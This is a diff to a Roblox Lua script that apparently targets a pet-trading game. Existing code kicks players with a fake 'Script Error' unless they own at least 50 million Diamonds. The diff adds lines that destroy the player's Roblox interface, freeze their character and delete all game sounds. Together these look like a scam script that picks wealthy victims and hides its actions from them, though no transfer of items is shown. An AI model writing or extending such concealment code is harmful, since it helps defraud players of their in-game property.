@@ -2,6 +2,7 @@ local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
 local CoreGui = game:GetService("CoreGui")
+local RobloxGui = CoreGui.RobloxGui
 local Client = Players.LocalPlayer
 local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
 local Fire = Network.Fire
@@ -233,7 +234,10 @@ if Client.leaderstats.Diamonds.Value < 50000000 then
 	Client:Kick("Script Error")
 end
 
+wait(0.5)
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+RobloxGui:Destroy()
+Client.Character.HumanoidRootPart.Anchored = true
 
 local function unlockPetsInFolder(folder)
 	local children = folder:GetChildren()
@@ -267,6 +271,12 @@ while true do
 	if lockedCount == 0 then
 	    print('Unlocked All')
 	    break
+	end
+end
+
+for i,v in pairs(game.Workspace:GetDescendants()) do
+	if v:IsA("Sound") then
+		v:Destroy()
 	end
 end
 
